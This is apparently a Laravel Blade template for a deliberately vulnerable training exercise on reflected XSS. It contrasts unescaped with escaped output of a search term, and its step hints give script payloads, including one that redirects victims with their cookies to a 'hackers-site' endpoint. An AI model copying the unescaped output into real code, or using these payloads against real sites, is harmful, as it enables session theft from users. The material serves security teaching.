@extends('layouts.main')

<script>
  const showHint = (event) => {
    console.dir(event.target);
    event.target.parentNode.classList.remove('hidden');
  }

  document.addEventListener("DOMContentLoaded", function() {
    const hiddenHints = document.querySelectorAll('.step-hint.hidden');
    console.log(hiddenHints);
    hiddenHints.forEach(hiddenHint => hiddenHint.addEventListener('click', showHint));
  });
</script>

@section('content')
  <div class="instruction">
    <p>A strategy that is used to insert JavaScript code on a page. It can be used to redirect a user, display a clone of your site, steal your session information, etc.</p>

    <p><strong>Reflected XSS attack</strong>
    When a parameter in the URL is displayed on the page. If the site doesn’t escape the params (turn code into special characters), the code is run.</p>

    <p><strong>Stored XSS attack</strong>
    When user inputted data is stored in the DB. If user input isn’t escaped (before adding to the DB or before displaying it on the page), then any malicious code that was stored in the database will be run. This can affect many users like in a forum setting.</p>
  </div>

  <div class="directions">
    <h2>Exercise Directions - Reflected XSS Attack</h2>
    <p>Search for a user name below</p>
    <p>The search term you enter will be displayed on the page, along with the search results</p>
  </div>

  <div class="exercise-container sql-injection-exercise-container">
    <div class="exercise">
      <h2>Find Users</h2>
      <form method="get" action="{{action('XssAttackController@findUsers')}}">
        <input type="hidden" name="_token" value="{{ csrf_token() }}">
        <div class="form-group">
          <label for="name">Name</label>
          <input type="text" id="name" name="name" value="{{$old_name ?? null}}" placeholder="Enter Name">
        </div>
        <div class="buttons-container">
          <input type="submit" class="button" name="search" value="Search" />
        </div>
      </form>

      @if(isset($found_users))
        <h3>Risky user content being displayed</h3>
        <p>
          You searched for "{!! $old_name !!}"
        </p>

        <h3>Safe user content being displayed</h3>
        <p>
          You searched for "{{ $old_name }}"
        </p>

        <h3>Users Found</h3>
        @forelse ($found_users as $user)
          <p>{{ $user->name }}</p>
        @empty
          <p>No users found</p>
        @endforelse
      @endif
    </div>

    <div class="steps">
      <h2>Steps</h2>
      <ul>
        <li>
          <span class="step-title">1. Make a search and evaluate the URL for any vulnerabilities</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Does the URL contain any GET parameters?</span></span>
        </li>
        <li>
          <span class="step-title">2. See if the search value is being displayed on the screen</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>If it is shown on the screen, the page might have a cross-site scripting (XSS vulnerability)</span></span>
        </li>
        <li>
          <span class="step-title">3. Add some JS code into the URL bar to force the page to hopefully run it</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out where in the URL to add the code</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>What tags are needed to run JavaScript code?</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the URL bar: <code>{{url('/')}}/xss-attack?name={{"<script>alert('Yo this site has a XSS vulnerability')</script>"}}</code></span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>You can also just search for: <code>{{"<script>alert('Yo this site has a XSS vulnerability')</script>"}}</code></span></span>
          <span class="step-hint">Note: <span>Google Chrome may block XSS attacks, so in order to test it, use Firefox</span></span>
        </li>
        <li>
          <span class="step-title">4. Think about how to run a whole lot of JavaScript without putting too much in the URL</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Try running an external JS file (it's less obvious)</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>{{"<script src='" . url('/') . "/js/external-xss.js'></script>"}}</code></span></span>
        </li>
        <li>
          <span class="step-title">5. What else can you do with JavaScript besides popping up an alert?</span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Is there any sensitive data that is stored in JavaScript that I may want to access?</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>How about the cookies? Redirect the user to another site and send their cookies along for the ride.</span></span>
          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>{{"<script>window.location.replace('" . url('/') . "/hackers-site?cookie=' + document.cookie)</script>"}}</code></span></span>
        </li>
      </ul>
    </div>
  </div>

@endsection
